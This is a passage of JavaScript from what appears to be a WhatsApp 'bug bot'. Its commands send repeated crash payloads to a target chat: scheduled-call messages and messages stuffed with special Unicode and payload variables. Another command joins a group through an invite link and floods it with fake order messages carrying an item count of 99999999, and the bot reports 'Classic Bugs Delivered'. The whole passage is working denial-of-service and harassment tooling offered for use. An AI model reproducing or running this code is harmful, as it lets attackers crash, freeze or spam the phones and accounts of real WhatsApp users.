attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓ً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓ً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓ً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
}
reply(`*Classic Bugs Delivered ${rumgc} Wait for 3 Minutes*`)
break
//=================================================//
case 'xzvcart': case 'xzvgc': case 'xyg777': {
 if (!isCreator) return reply('*Premium Command*')
 await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await zetsubo.groupAcceptInvite(result)
jumlah = "20"
for (let i = 0; i < jumlah; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 99999999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": teks,
"orderTitle": `༐༑𝐒⸙𝐀ᚗ𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑${cttl}`, // 
"sellerJid": "6289503267904@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
zetsubo.relayMessage(rumgc, order.message, { messageId: order.key.id })
await sleep(1000)
}
}
break
//=================================================//
case 'directattention' : case 'schedulemaster' : case 'unlibreak' : case 'multiattention' : case 'schedulecall++' : case 'icall' : case 'unlicall' : case '30call' : case 'unlibreak' : case 'unlibom' : case 'unlilag' :  {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
	}
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀᪣𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀ᚔ𝐌𝐗${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
